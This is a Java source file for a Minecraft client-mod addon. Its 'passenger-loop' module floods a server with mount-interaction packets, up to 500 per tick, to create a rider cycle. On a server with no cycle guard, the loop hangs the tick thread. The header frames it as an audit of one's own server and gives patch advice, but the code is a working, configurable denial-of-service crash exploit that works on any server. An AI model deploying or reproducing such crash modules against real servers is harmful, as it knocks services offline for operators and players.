package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.EntityHitResult;

/**
 * AUDIT: Passenger Mount Loop
 *
 * Spams mount-interaction packets on the entity you're looking at (and on your
 * current vehicle, if any), trying to provoke a passenger cycle - A rides B while
 * B rides A. If the server's passenger/vehicle traversal lacks a cycle guard,
 * building such a loop makes any code that walks the passenger chain (movement,
 * saving, dismount, rendering bounds) recurse without end and hang the tick loop.
 *
 * Look at a rideable entity (ideally while already riding another) and enable.
 *
 * Patch signal: reject any mount that would make an entity its own (transitive)
 * passenger; bound passenger-chain traversal depth defensively so a malformed
 * cycle can never spin a server thread.
 *
 * Run against your OWN local server only.
 */
public class PassengerLoop extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("interactions-per-tick").description("Mount interactions sent each tick.")
        .defaultValue(20).range(1, 500).sliderRange(1, 100).build()
    );
    private final Setting<Boolean> includeVehicle = sgGeneral.add(new BoolSetting.Builder()
        .name("include-vehicle").description("Also interact with the vehicle you're riding.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> autoMonitor = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-monitor")
        .description("Auto-enable Server Health Monitor to track TPS impact while this module runs.")
        .defaultValue(true).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private int ticksActive = 0, packetsSent = 0;

    public PassengerLoop() {
        super(AddonTemplate.CRASH_CATEGORY, "passenger-loop",
            "Spams mount interactions to provoke a passenger cycle. Tests passenger-chain cycle guard / traversal bounds.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
        if (autoMonitor.get()) {
            var shm = Modules.get().get(ServerHealthMonitor.class);
            if (shm != null && !shm.isActive()) shm.toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;

        Entity looked = (mc.crosshairTarget instanceof EntityHitResult ehr) ? ehr.getEntity() : null;
        Entity vehicle = includeVehicle.get() ? mc.player.getVehicle() : null;
        if (looked == null && vehicle == null) return;

        for (int i = 0; i < perTick.get(); i++) {
            if (looked != null)
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.interact(looked, mc.player.isSneaking(), Hand.MAIN_HAND));
            packetsSent++;
            if (vehicle != null)
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.interact(vehicle, mc.player.isSneaking(), Hand.MAIN_HAND));
            packetsSent++;
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
